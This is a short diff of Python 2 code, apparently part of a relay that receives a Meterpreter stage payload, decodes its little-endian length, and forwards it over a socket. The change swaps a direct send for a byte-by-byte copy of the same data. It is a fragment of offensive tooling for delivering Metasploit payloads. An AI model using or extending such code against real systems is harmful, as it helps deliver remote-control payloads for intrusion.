@@ -24,6 +24,7 @@ def child(sock,certfile='',keyfile=''):
 		pktfixed=str(pkt.encode('hex_codec'))
 		pktfixed2=pktfixed[6:8]+pktfixed[4:6]+pktfixed[2:4]+pktfixed[0:2]
 		print 'receiving meterpreter size: '+str(int(pktfixed2,16))+" HEX: "+pktfixed2+" original: "+pktfixed
+	
 		pkt2=""
 		MSGLEN=int(pktfixed2,16)
 		while len(pkt2) < MSGLEN:
@@ -34,7 +35,11 @@ def child(sock,certfile='',keyfile=''):
 
 		print "sent payload size: "+str(len(pkt2))
 		sock.send(pkt)
-		sock.send(pkt2)
+		#sock.send(pkt2)
+		pkt3=""
+		for c in pkt2:
+			pkt3+=chr(ord(c))
+		sock.send(pkt3)
 
 		sock.settimeout(1.0)		
 		targetsock.settimeout(1.0)
